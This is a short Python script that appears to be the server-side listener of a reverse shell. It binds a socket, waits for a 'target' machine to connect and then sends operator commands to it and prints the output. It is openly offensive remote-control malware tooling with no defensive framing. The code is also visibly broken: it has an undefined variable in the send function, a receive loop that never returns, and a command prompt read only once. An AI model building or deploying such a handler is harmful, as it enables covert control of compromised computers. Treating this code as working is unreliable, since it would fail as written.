
#!/usr/bin/python
import socket
import json

def relaible_send(data):
	global json_data
	json_data=json.dumps(data).encode('utf-8')
	target.send(json_datan)

def relaible_recv():
	json_data=""
	while True:
		try:
			json_data=json_data+target.recv(1024)
			json.loads(json_data)
		except ValueError:
			continue

def shell():
	command=raw_input("#~"+ip)
	while True:
		relaible_send(command)
		if command=='q':
			break
		else:
			result=relaible_recv()
			print(result)

def server():
	global s
	global ip
	global target
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(("127.0.0.1",54321))
	s.listen(5)
	print("Listening for incoming connections...")
	target,ip=s.accept()
	print("Target Connected!")

server()
shell()
s.close()
